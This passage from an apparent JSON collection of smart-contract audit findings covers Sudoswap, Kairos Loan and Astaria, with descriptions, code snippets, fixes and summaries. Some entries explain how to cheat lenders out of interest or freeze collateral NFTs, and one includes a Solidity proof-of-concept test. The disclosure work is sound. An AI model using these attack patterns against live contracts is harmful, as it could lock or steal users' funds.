locking of user funds with high impact and likelihood. If the problematic functions were integrated into a UI, then this would be evaluated as CRITICAL, but given that the current integrations significantly reduce the likelihood, we evaluate the severity as HIGH.\n\n**Recommended Mitigation:**\nPass `minOutput` through to the internal functions to be used in refund calculations and correctly reflect the true contract balance, validating that this amount is not exceeded. This way, the [`outputAmount`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L94) [return value](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L104-L106) will correctly reflect the excess ETH transferred to the caller.\n\n**Sudoswap:**\nAcknowledged. This issue is present in current implementation of the Router, but no UIs are currently integrated to interact with this specific function. The contract is expected to be deprecated soon in favour of the VeryFastRouter.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "\nThe Cyfrin team has identified a bug in the `LSSVMRouter` contract that is currently live on mainnet. This bug affects the functions `LSSVMRouter::swapNFTsForSpecificNFTsThroughETH` and `LSSVMRouter::swapNFTsForAnyNFTsThroughETH`, which are used to swap non-fungible tokens (NFTs) for ETH. If a user specifies a non-zero `minOutput` value, this amount will be deducted from the `inputAmount` sent on the second half of the swap, from ETH to NFTs. This means that the excess value represented by `minOutput` is not included in the refund calculation, and so will not be included in the subsequent ETH transfer. As a result, any excess ETH as specified by `minOutput` will remain locked in the router forever.\n\nFortunately, these functions have never actually been called on the mainnet deployment as they have not been connected to the Sudoswap front end. While Sudoswap doesn't use these functions on the client, contract-level integrators may find themselves with potentially lost funds, so the Sudorandom Labs team has attempted to reach out to those potentially affected.\n\nThis vulnerability has high impact and likelihood, but is not considered critical as the current integrations significantly reduce the likelihood. The recommended mitigation is to pass `minOutput` through to the internal functions to be used in refund calculations and correctly reflect the true contract balance. This way, the `outputAmount` return value will correctly reflect the excess ETH transferred to the caller.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "12282",
      "title": "M-5: If auction price goes to 0, NFT might become unclaimable/ stuck forever",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-kairos-judging/issues/17 \n\n## Found by \nGimelSec, Koolex, Vagner, chaduke, deadrxsezzz\n\n## Summary\nThere are certain ERC20 tokens which revert on zero value transfers (e.g. LEND). If an NFT's price drops down to 0, nobody will be able to claim it as the transaction will always revert.\n\n## Vulnerability Detail\nThe time of  `loan.auction.duration` passes. The NFT's price is 0. Alice tries to purchase/ claim it, however the ERC20 token on which the auctions is going reverts on 0 value transfers. The NFT becomes stuck forever and no one can take the rights of it.\n\nConsider the following scenarios: \n1.\n > The ERC20 used in the auction is pausable \n > Throughout the auction, the token gets paused. Now, the auction is still going, the price is dropping and no one is able to claim it.\n > The ERC20 doesn't get unpaused up until the auction ends.\n > Since no one was able to purchase the NFT during the auction, its price now is 0. Since the token reverts on zero value transfers, the NFT is stuck forever.\n\n2.\n > Alice is looking at NFT auction which is coming near its end.\n > Alice is looking to purchase the NFT for as little as possible and starts monitoring the mempool, so in case someone tries to buy it, she can front-run the transaction and get the NFT herself. At this point Alice getting the NFT should be guaranteed\n > However, there aren't many other active users/ they aren't paying attention to said NFT. Little time goes by, auction ends and price is set to 0.\n > Alice is happy she can claim the NFT for free. However, the token reverts on 0 value transfers and now no one can claim it and the NFT is lost forever.\n\n## Impact\nNFT might be lost forever\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L43-#L45\n\n## Tool used\n\nManual Review\n\n## Recommendation\nAddress ERC20 tokens which revert on 0 value transfers. Auctions which are run with such tokens should have a minimal price of 1 wei ( instead of 0)\n\n\n\n## Discussion\n\n**npasquie**\n\nfix: https://github.com/kairos-loan/kairos-contracts/pull/49",
      "summary": "\nThis bug report is about an issue that occurs when an NFT's price drops to 0 during an auction. If the ERC20 token used in the auction reverts on 0 value transfers, then no one will be able to claim the NFT and it will become stuck forever. This issue was found by GimelSec, Koolex, Vagner, chaduke, and deadrxsezzz, and the impact is that the NFT will be lost forever. To address this issue, it is recommended to address ERC20 tokens that revert on 0 value transfers, and have a minimal price of 1 wei instead of 0. A fix has been proposed in the form of a pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Kairos Loan",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-kairos-judging/issues/17",
      "tags": [],
      "finders": [
        "Koolex",
        "Vagner",
        "deadrxsezzz",
        "chaduke",
        "GimelSec"
      ]
    },
    {
      "id": "12281",
      "title": "M-4: minOfferCost can be bypassed in certain scenarios",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-kairos-judging/issues/23 \n\n## Found by \n0x52\n\n## Summary\n\nminOfferCost is designed to prevent spam loan requests that can cause the lender to have positions that cost more gas to claim than interest. Due to how interest is calculated right after this minimum is passed it is still possible for the lender to receive less than the minimum.\n\n## Vulnerability Detail\n\n[ClaimFacet.sol#L94-L106](https://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/ClaimFacet.sol#L94-L106)\n\n    function sendInterests(Loan storage loan, Provision storage provision) internal returns (uint256 sent) {\n        uint256 interests = loan.payment.paid - loan.lent;\n        if (interests == loan.payment.minInterestsToRepay) {\n            // this is the case if the loan is repaid shortly after issuance\n            // each lender gets its minimal interest, as an anti ddos measure to spam offer\n            sent = provision.amount + (interests / loan.nbOfPositions);\n        } else {\n            /* provision.amount / lent = share of the interests belonging to the lender. The parenthesis make the\n            calculus in the order that maximizes precison */\n            sent = provision.amount + (interests * (provision.amount)) / loan.lent; <- audit-issue minimal interest isn't guaranteed\n        }\n        loan.assetLent.checkedTransfer(msg.sender, sent);\n    }\n\nWhen a loan has generated more than the minimum interest amount the method for calculating the interest paid is different and depending on the size of the provisions it may lead to provisions that are under the guaranteed minimum.\n\nExample:\nAssume the minimum interest is 1e18. A loan is filled with 2 provisions. The first provision is 25% and the second is 75%. Since there are two loans the total minimum interest for the loan is 2e18. After some time the paid interest reaches 2.001e18 and the loan is paid back. Since it is above the minimum interest rate, it is paid out proportionally. This gives 0.5e18 to the first provision and 1.5e18 to the second provision. This violates the minimum guaranteed interest amount.\n\n## Impact\n\nMinimum interest guarantee can be violated\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/ClaimFacet.sol#L94-L106\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nMinimum interest should be set based on the percentage of the lowest provision and provision shouldn't be allowed to be lower than some amount. Since this problem occurs when the percentage is less than 1/n (where n is the number of provisions), any single provision should be allowed to be lower than 1/(2n). \n\n\n\n## Discussion\n\n**npasquie**\n\nfixed by https://github.com/kairos-loan/kairos-contracts/pull/51\nthe fix restricts the nb of offer/provision per loan to 1 eliminating the vulnerability",
      "summary": "\nThis bug report is about an issue in the code of the Kairos Loan platform. The issue is that the minOfferCost, which is designed to prevent spam loan requests that can cause the lender to have positions that cost more gas to claim than interest, can be bypassed in certain scenarios. This happens when the paid interests is higher than the minimum guaranteed interest and the loan is paid back. The code snippet that is affected is found in ClaimFacet.sol#L94-L106. The impact of this issue is that the minimum interest guarantee can be violated. The bug was found by 0x52 and the tool used for the review was manual review. The recommendation is to set the minimum interest based on the percentage of the lowest provision and to not allow any single provision to be lower than 1/(2n). The bug was fixed by a pull request on the Kairos Loan platform repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Kairos Loan",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-kairos-judging/issues/23",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "12280",
      "title": "M-3: Adversary can utilize a large number of their own loans to cheat other lenders out of interest",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-kairos-judging/issues/24 \n\n## Found by \n0x52, GimelSec\n\n## Summary\n\nThe minimal interest paid by a loan is scaled by the number of provisions that make up the loan. By inflating the number of provisions with their own provisions then can cause legitimate lenders to receive a much lower interest rate than intended.\n\n## Vulnerability Detail\n\n[ClaimFacet.sol#L94-L106](https://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/ClaimFacet.sol#L94-L106)\n\n    function sendInterests(Loan storage loan, Provision storage provision) internal returns (uint256 sent) {\n        uint256 interests = loan.payment.paid - loan.lent;\n        if (interests == loan.payment.minInterestsToRepay) {\n            // this is the case if the loan is repaid shortly after issuance\n            // each lender gets its minimal interest, as an anti ddos measure to spam offer\n            sent = provision.amount + (interests / loan.nbOfPositions);\n        } else {\n            /* provision.amount / lent = share of the interests belonging to the lender. The parenthesis make the\n            calculus in the order that maximizes precison */\n            sent = provision.amount + (interests * (provision.amount)) / loan.lent;\n        }\n        loan.assetLent.checkedTransfer(msg.sender, sent);\n    }\n\nIf a loan is paid back before the minimal interest rate has been reached then each provision will receive the unweighted minimal interest amount. This can be abused to take loans that pay legitimate lenders a lower APR than expected, cheating them of their yield.\n\nExample:\nA user wishes to borrow 1000 USDC at 10% APR. Assume the minimal interest per provision is 10 USDC and minimum borrow amount is 20 USDC. After 1 year the user would owe 100 USDC in interest. A user can abuse the minimum to pay legitimate lenders much lower than 10% APR. The attacker will find a legitimate offer to claim 820 USDC. This will create an offer for themselves and borrow 20 USDC from it 9 times. This creates a total of 10 provisions each owed a minimum of 10 USDC or 100 USDC total. Now after 1 year they owe 100 USDC on their loan and the repay the loan. Since 100 USDC is the minimum, each of the 10 provisions will get their minimal interest. 90 USDC will go to their provisions and 10 will go to the legitimate user who loaned them a majority of the USDC. Their APR is ~1.2% which is ~1/9th of what they specified.\n\n## Impact\n\nLegitimate users can be cheated out of interest owed\n\n## Code Snippet\n\n[ClaimFacet.sol#L94-L106](https://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/ClaimFacet.sol#L94-L106)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe relative size of the provisions should be enforced so that one is not much larger than any other one\n\n\n\n## Discussion\n\n**npasquie**\n\nsimilar to #66\n\n**npasquie**\n\nfixed by https://github.com/kairos-loan/kairos-contracts/pull/51\nthe fix restricts the nb of offer/provision per loan to 1 eliminating the vulnerability",
      "summary": "\nThis bug report was found by 0x52 and GimelSec and relates to the issue of an adversary utilizing a large number of their own loans to cheat other lenders out of interest. This bug was found in the ClaimFacet.sol file, specifically lines 94-106. If a loan is paid back before the minimal interest rate has been reached then each provision will receive the unweighted minimal interest amount, allowing the adversary to pay legitimate lenders a lower APR than expected. \n\nAn example of this is if a user wishes to borrow 1000 USDC at 10% APR, but creates an offer for themselves and borrows 20 USDC from it 9 times. This creates a total of 10 provisions each owed a minimum of 10 USDC or 100 USDC total. After 1 year they owe 100 USDC on their loan and the repay the loan. Since 100 USDC is the minimum, each of the 10 provisions will get their minimal interest. 90 USDC will go to their provisions and 10 will go to the legitimate user who loaned them a majority of the USDC. Their APR is ~1.2% which is ~1/9th of what they specified.\n\nThe impact of this bug is that legitimate users can be cheated out of interest owed. The recommendation is to enforce the relative size of the provisions so that one is not much larger than any other one. This bug was fixed by restricting the number of offers/provisions per loan to 1, eliminating the vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Kairos Loan",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-kairos-judging/issues/24",
      "tags": [],
      "finders": [
        "0x52",
        "GimelSec"
      ]
    },
    {
      "id": "12279",
      "title": "M-2: useLoan doesn't allow liqudator to specifiy maximum price",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-kairos-judging/issues/25 \n\n## Found by \n0x52\n\n## Summary\n\nuseLoan doesn't allow the liquidator to specify a max price they are will to pay for the collateral they are liquidating. On the surface this doesn't seem like an issue because the price is always decreasing due to the dutch auction. However this can be problematic if the chain the contracts are deployed suffers a reorg attack. This can place the transaction earlier than anticipated and therefore charge the user more than they meant to pay. On Ethereum this is unlikely but this is meant to be deployed on any compatible EVM chain many of which are frequently reorganized.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nLiquidator can be charged more than intended\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L59-L73\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow liquidator to specify a max acceptable price to pay\n\n\n\n## Discussion\n\n**npasquie**\n\nfixed here https://github.com/kairos-loan/kairos-contracts/pull/50",
      "summary": "\nThis bug report is about the useLoan feature in the kairos-contracts repository not allowing the liquidator to specify a maximum price they are willing to pay for the collateral they are liquidating. This can be problematic if the chain the contracts are deployed on suffers a reorg attack, which can place the transaction earlier than anticipated and therefore charge the user more than they meant to pay. On Ethereum this is unlikely, but this is meant to be deployed on any compatible EVM chain, many of which are frequently reorganized. It was found manually and the code snippet can be found at the given link. The recommendation is to allow liquidator to specify a max acceptable price to pay. The bug was fixed in a pull request.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Kairos Loan",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-kairos-judging/issues/25",
      "tags": [
        "Chain Reorganization Attack"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "12278",
      "title": "M-1: Denial-of-Service in the liquidation flow results in the collateral NTF will be stuck in the contract.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-kairos-judging/issues/76 \n\n## Found by \nInspex, jekapi\n\n\n## Summary\nIf the `loanTovalue` value of the offer is extremely high, the liquidation flow will be reverted, causing the collateral NTF to persist in the contract forever.\n\n\n## Vulnerability Detail\nThe platform allows users to sign offers and provide funds to those who need to borrow assets.\n\nIn the first scenario, the lender provided an offer that the `loanTovalue` as high as the result of the `shareMatched` is `0`. For example, if the borrowed amount was `1e40` and the offer had a `loanTovalue` equal to `1e68`, the share would be `0`.\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/BorrowLogic/BorrowHandlers.sol#L47\n\nAs a result, an arithmetic error (`Division or modulo by 0`) will occur in the `price()` function at line 50 during the liquidation process.\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L34-L55\n\nIn the second scenario, if the lender's share exceeds `0`, but the offer's `loanToValue` is extremely high, the `price()` function at line 54 may encounter an arithmetic error(`Arithmetic over/underflow`) during the `estimatedValue` calculation.\n\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L54\n\n## Poof of Concept\n**kairos-contracts/test/BorrowBorrow.t.sol**\n```solidity\nfunction testBorrowOverflow() public {\n    uint256 borrowAmount = 1e40;\n    BorrowArg[] memory borrowArgs = new BorrowArg[](1);\n    (, ,uint256 loanId , ) = kairos.getParameters();\n    loanId += 1;\n\n    Offer memory offer = Offer({\n            assetToLend: money,\n            loanToValue: 1e61,\n            duration: 1,\n            expirationDate: block.timestamp + 2 hours,\n            tranche: 0,\n            collateral: getNft()\n        });\n    uint256 currentTokenId;\n\n    getFlooz(signer, money, getOfferArg(offer).amount);\n\n    {\n        OfferArg[] memory offerArgs = new OfferArg[](1);\n        currentTokenId = getJpeg(BORROWER, nft);\n        offer.collateral.id = currentTokenId;\n        offerArgs[0] = OfferArg({\n            signature: getSignature(offer),\n            amount: borrowAmount,\n            offer: offer\n        });\n        borrowArgs[0] = BorrowArg({nft: NFToken({id: currentTokenId, implem: nft}), args: offerArgs});\n    }\n\n    vm.prank(BORROWER);\n    kairos.borrow(borrowArgs);\n\n    assertEq(nft.balanceOf(BORROWER), 0);\n    assertEq(money.balanceOf(BORROWER), borrowAmount);\n    assertEq(nft.balanceOf(address(kairos)), 1);\n\n    vm.warp(block.timestamp + 1);\n    Loan memory loan = kairos.getLoan(loanId);\n    console.log(\"price of loanId\", kairos.price(loanId));\n}\n```\n\n\n\n## Impact\nThe loan position will not be liquidated, which will result in the collateral NTF being permanently frozen in the contract.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/BorrowLogic/BorrowHandlers.sol#L47\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L50\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L54\n## Tool used\n\nManual Review\n\n## Recommendation\nWe recommend adding the mechanism during the borrowing process to restrict the maximum `loanToValue` limit and ensure that the lender's share is always greater than zero. This will prevent arithmetic errors.\n\n\n\n## Discussion\n\n**npasquie**\n\nsimilar to #34 \n\n**npasquie**\n\nfixed here https://github.com/kairos-loan/kairos-contracts/pull/52",
      "summary": "\nThis bug report discusses a denial-of-service vulnerability in the liquidation flow of the Kairos platform. If the loanTovalue value of the offer is extremely high, the liquidation flow will be reverted, causing the collateral NTF to persist in the contract forever. This can happen in two scenarios: when the lender provides an offer that the loanTovalue is equal to the result of the shareMatched is 0, or when the lender's share exceeds 0 but the offer's loanToValue is extremely high. If this happens, the loan position will not be liquidated, resulting in the collateral NTF being permanently frozen in the contract. Manual review and the Poof of Concept code snippet were used to identify the vulnerability. The bug was fixed by adding a mechanism during the borrowing process to restrict the maximum loanToValue limit and ensure that the lender's share is always greater than zero.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Kairos Loan",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-kairos-judging/issues/76",
      "tags": [
        "DOS",
        "Denial-Of-Service"
      ],
      "finders": [
        "Inspex",
        "jekapi"
      ]
    },
    {
      "id": "7353",
      "title": "AstariaRouter has unnecessary access to setPayee",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n**Context:** LienToken.sol#L872\n\n**Description:** setPayee is never called from AstariaRouter, but the router has access to call LienToken.setPayee.\n\n**Recommendation:** Remove unneeded access:\n\n```solidity\nfunction setPayee(Lien calldata lien, address newPayee) public {\n    ...snip...\n    require(\n        - msg.sender == ownerOf(lienId) || msg.sender == address(s.ASTARIA_ROUTER)\n        + msg.sender == ownerOf(lienId)\n    );\n    ...snip...\n}\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7352",
      "title": "CollateralToken.flashAction reverts with incorrect error",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nCollateralToken.sol#L272\n\n## Description\nReverts with `InvalidCollateralStates.AUCTION_ACTIVE` when the address is not `flashEnabled`.\n\n## Recommendation\nRevert using `InvalidCollateralStates.FLASH_DISABLED`:\n\n```solidity\nfunction flashAction(\n    IFlashAction receiver,\n    uint256 collateralId,\n    bytes calldata data\n) external onlyOwner(collateralId) {\n    ...snip...\n    if (!s.flashEnabled[addr]) {\n        - revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n        + revert InvalidCollateralState(InvalidCollateralStates.FLASH_DISABLED);\n    }\n    ...snip...\n}\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7351",
      "title": "PublicVault.accrue is manually inlined rather than called",
      "impact": "LOW",
      "content": "## Code Analysis Report\n\n## Severity\n**Low Risk**\n\n## Context\n- `PublicVault.sol#L438-L448`\n- `PublicVault.sol#L611-L617`\n\n## Description\nThe `accrue` function locks in the implied value of the PublicVault by calculating, then adding to `yIntercept`, and finally emitting an event. This calculation is duplicated in three separate locations in `PublicVault`:\n- In `totalAssets`\n- In `_accrue`\n- And in `updateVaultAfterLiquidation`\n\n## Recommendation\nThe calculation itself can be factored out into a view function, which can be reused in both `totalAssets` and `_accrue`:\n\n```solidity\nfunction totalAssets()\n    public\n    view\n    virtual\n    override(ERC4626Cloned)\n    returns (uint256)\n{\n    VaultData storage s = _loadStorageSlot();\n    uint256 delta_t = block.timestamp - s.last;\n    return uint256(s.slope).mulDivDown(delta_t, 1) + uint256(s.yIntercept);\n}\n```\n\n```solidity\nfunction _accrue(VaultData storage s) internal returns (uint256) {\n    unchecked {\n        s.yIntercept = (_totalAssets(s)).safeCastTo88();\n        s.last = block.timestamp.safeCastTo40();\n    }\n    emit YInterceptChanged(s.yIntercept);\n    return s.yIntercept;\n}\n```\n\nAnd finally, `accrue` may be used in `updateVaultAfterLiquidation` so that emitting the event is not missed:\n\n```solidity\nfunction updateVaultAfterLiquidation(\n    uint256 maxAuctionWindow,\n    AfterLiquidationParams calldata params\n) public returns (address withdrawProxyIfNearBoundary) {\n    require(msg.sender == address(LIEN_TOKEN())); // can only be called by router\n    VaultData storage s = _loadStorageSlot();\n    unchecked {\n        _accrue(s);\n        s.slope -= params.lienSlope.safeCastTo48();\n    }\n    // ...snip...\n}\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7350",
      "title": "Avoid shadowing variables",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nLienToken.sol#L583\n\n## Description\nThe highlighted line declares a new variable `owner` which has already been defined in `Auth.sol` inherited by `LienToken`:\n```\naddress owner = ownerOf(lienId);\n```\n\n## Recommendation\nRename `owner` to `lienOwner` at `LienToken.sol#L583`.\n\n## Astaria\nFixed in PR 251.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7349",
      "title": "Manually constructed storage slots can be chosen so that the pre-image of the hash is unknown",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- AstariaRouter.sol#L54-L55\n- LienToken.sol#L46-L48\n- CollateralToken.sol#L69-L70\n- PublicVault.sol#L58-L59\n- VaultImplementation.sol#L46-L47\n- WithdrawProxy.sol#L48-L49\n- Pausable.sol#L20-L21\n- ERC20-Cloned.sol#L14\n- ERC721.sol#L13-L14\n\n## Description\nIn the codebase, some storage slots are manually constructed using `keccak256` hash of a string `xyz.astaria.<PATH>`. The pre-images of these hashes are known. This can allow in the future for actors to find a potential path to those storage slots using the `keccak256` hash function in the codebase and some crafted payload.\n\n## Recommendation\n1. Subtract 1 from these hashes so that the pre-image would be unknown / less obvious.\n2. Keep them as it is without manually calculating the hash and inlining them as the compiler does that for us off-chain.\n\nSo in general:\n```solidity\nuint256 private constant NAMED_SLOT = uint256(keccak256(\"xyz.astaria.<PATH>\")) - 1;\n```\n\nAnd for:\n- WithdrawProxy.sol#L48-L49\n- Pausable.sol#L20-L21\n- ERC20-Cloned.sol#L14\n- ERC721.sol#L13-L14\n\nspecifically, what should be used:\n```solidity\nbytes32 constant NAMED_SLOT = bytes32(uint256(keccak256(\"xyz.astaria.<PATH>\")) - 1);\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7348",
      "title": "There are no range/value checks when some parameters get file ed",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context:\n- AstariaRouter.sol#L196\n- AstariaRouter.sol#L268\n- CollateralToken.sol#L191\n- LienToken.sol#L77\n\n## Description:\nThere are no range/value checks when some parameters get updated. For example:\n- There are no hardcoded range checks for the ...Numerators and ...Denominators, so that the protocol's users can trustlessly assume the authorized users would not push these values into ranges deemed unacceptable.\n- When an address gets updated, we don't check whether the value provided is `address(0)` or not.\n\n## Recommendation:\nApply value/range checks for the parameters that can be updated using the file endpoints.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7347",
      "title": "setNewGuardian can be changed to a 2 or 3 step transfer of authority process",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- AstariaRouter.sol#L262-L266\n- AstariaRouter.sol#L268\n\n## Description\nThe current guardian might pass a wrong `_guardian` parameter to `setNewGuardian` which can break the upgradability of the AstariaRouter using `fileGuardian`.\n\n## Recommendation\nIt might be best to convert the transfer of guardianship into a 2 or 3 step process.\n\n## Astaria\nThis is intentional; we want to be able to remove all permissions if we decide to crystallize the protocol.\n\n## Spearbit\nRenouncing the guardian can have its own separate endpoint possibly.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7346",
      "title": "Some functions do not emit events, but they should",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- **AstariaRouter.sol**: Line 268\n- **VaultImplementation.sol**: Line 195\n- **PublicVault.sol**: \n  - Line 579\n  - Line 528\n  - Line 491\n  - Line 565\n\n## Description\nAstariaRouter.sol#L268: Other filing endpoints in the same contract and also CollateralToken and LienToken emit `fileUpdated(what, data)`. But `fileGuardian` does not.\n\n## Recommendation\nMake sure these endpoints emit events as some off-chain agents might be monitoring the protocol for these events.\n\n## Status\n- **Astaria**: Solved in PR 240.\n- **Spearbit**: Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7345",
      "title": "Wrong parameter type is used for s.strategyValidators",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- IAstariaRouter.sol#L82\n- AstariaRouter.sol#L254\n- AstariaRouter.sol#L345\n- AstariaRouter.sol#L349\n\n## Description\n`s.strategyValidators` is of type `mapping(uint32 => address)` but the provided type in the context is of type `uint8`.\n\n## Recommendation\nMake sure the typing is correct; either use `mapping(uint32 => address)` or `mapping(uint8 => address)`.\n\n## Astaria\nFixed by changing the type of `s.strategyValidators` to `mapping(uint8 => address)` in PR 241.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7344",
      "title": "Document and reason about which functionalities should be frozen on protocol pause",
      "impact": "LOW",
      "content": "## Security Analysis Report\n\n## Severity\n**Low Risk**\n\n## Context\n- PublicVault.sol#L247\n- PublicVault.sol#L338\n\n## Description\nOn protocol pause, a few functions are allowed to be called. Some instances are noted above. There is no documentation on why these functionalities are allowed while the remaining functions are frozen.\n\n## Recommendation\nSome guidelines should be provided which specify which functionalities should work when the protocol is paused.\n\n## Astaria\nAcknowledged. There is no harm letting people withdraw their money through the epoch system, but there is immense harm in allowing for any deposits to come in or for new loans to go out, as the pause would be due to some emergency or something that requires a contract update. When crystallizing the protocol we would remove the pause from the implementation before bricking upgrades.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
